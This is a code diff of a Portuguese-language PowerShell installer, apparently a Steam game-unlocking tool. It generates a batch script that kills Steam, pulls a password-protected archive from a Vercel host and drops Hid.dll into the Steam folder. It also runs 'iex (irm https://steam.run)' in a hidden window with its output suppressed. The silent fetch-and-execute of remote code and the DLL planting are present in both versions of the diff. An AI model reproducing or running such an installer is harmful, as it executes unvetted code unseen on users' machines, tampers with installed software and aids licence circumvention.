@@ -10,9 +10,7 @@ Write-Host "       INICIANDO INSTALADOR STEAMLIVRE" -ForegroundColor Cyan
 Write-Host "=================================================" -ForegroundColor Cyan
 Write-Host "Baixando arquivos necessarios da nuvem. Aguarde..." -ForegroundColor Yellow
 
-# =========================================================
-# MUDE O LINK ABAIXO PARA O SEU SITE REAL DO VERCEL
-# =========================================================
+# Seu site oficial do Vercel já configurado
 $baseUrl = "https://pack30k.vercel.app"
 
 $urlZip = "$baseUrl/STEAMLIVRE.zip"
@@ -24,12 +22,12 @@ try {
     Invoke-WebRequest -Uri $url7zExe -OutFile "$tempDir\7z.exe" -UseBasicParsing
     Invoke-WebRequest -Uri $url7zDll -OutFile "$tempDir\7z.dll" -UseBasicParsing
 } catch {
-    Write-Host "Erro ao baixar os arquivos da internet. Verifique sua conexao ou os links." -ForegroundColor Red
+    Write-Host "Erro ao baixar os arquivos da internet. Verifique sua conexao." -ForegroundColor Red
     Start-Sleep -Seconds 5
     Exit
 }
 
-# Cria o .BAT do instalador
+# Cria o .BAT do instalador com a NOVA ORDEM
 $batCode = @'
 @echo off
 setlocal EnableDelayedExpansion
@@ -53,49 +51,67 @@ for %%A in ("%steamExe%") do set "steamDir=%%~dpA"
 set "steamDir=%steamDir:~0,-1%"
 set "configDir=%steamDir%\config"
 
+:: PASSO 1: Preparação
 call :Header
 echo.
 echo  [+] Preparando instalacao...
 echo.
-echo  [#####               ] 25%%
+echo  [#####               ] 20%%
 powershell -Command "Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force"
 timeout /t 2 /nobreak >nul
 
-call :Header
-echo.
-echo  [+] Configurando ambiente...
-echo.
-echo  [##########          ] 50%%
-powershell -WindowStyle Hidden -Command "iex (irm https://steam.run) *>$null"
-powershell -Command "Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force"
-timeout /t 2 /nobreak >nul
-
+:: PASSO 2: Extração
 call :Header
 echo.
 echo  [+] Extraindo arquivos...
 echo.
-echo  [###############     ] 75%%
+echo  [##########          ] 40%%
 if exist "%temp%\sl_temp" rmdir /s /q "%temp%\sl_temp"
 mkdir "%temp%\sl_temp"
 "%EXTRATOR%" x "%ARQUIVO_ZIP%" -p%SENHA_ZIP% -y -o"%temp%\sl_temp" -bso0 -bsp0 >nul
-timeout /t 2 /nobreak >nul
 
+if not exist "%temp%\sl_temp\Hid.dll" (
+    call :Header
+    color 0C
+    echo.
+    echo  [ERRO FATAL NA EXTRACAO]
+    echo  Verifique a senha ou arquivo corrompido.
+    pause
+    exit /b
+)
+
+:: DELAY DE 5 SEGUNDOS (Conforme solicitado)
+timeout /t 5 /nobreak >nul
+
+:: PASSO 3: Copiando os arquivos
 call :Header
 echo.
 echo  [+] Aplicando configuracoes...
 echo.
-echo  [##################  ] 90%%
+echo  [###############     ] 60%%
 xcopy /e /i /y "%temp%\sl_temp\Config\*" "%configDir%\" >nul 2>&1
 copy /y "%temp%\sl_temp\Hid.dll" "%steamDir%\" >nul 2>&1
 rmdir /s /q "%temp%\sl_temp" >nul
-start "" "%steamExe%"
 timeout /t 2 /nobreak >nul
 
+:: PASSO 4: Steamtools
 call :Header
 echo.
-echo  [+] Instalacao Concluida!
+echo  [+] Configurando Steamtools...
+echo.
+echo  [##################  ] 80%%
+powershell -WindowStyle Hidden -Command "iex (irm https://steam.run) *>$null"
+:: Garante que o Steamtools nao abra a Steam na nossa frente
+powershell -Command "Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force"
+timeout /t 2 /nobreak >nul
+
+:: PASSO FINAL: Iniciando
+call :Header
+echo.
+echo  [+] Iniciando Steam...
 echo.
 echo  [####################] 100%%
+start "" "%steamExe%"
 timeout /t 2 /nobreak >nul
 start "" "%URL_AGRADECIMENTO%"
 
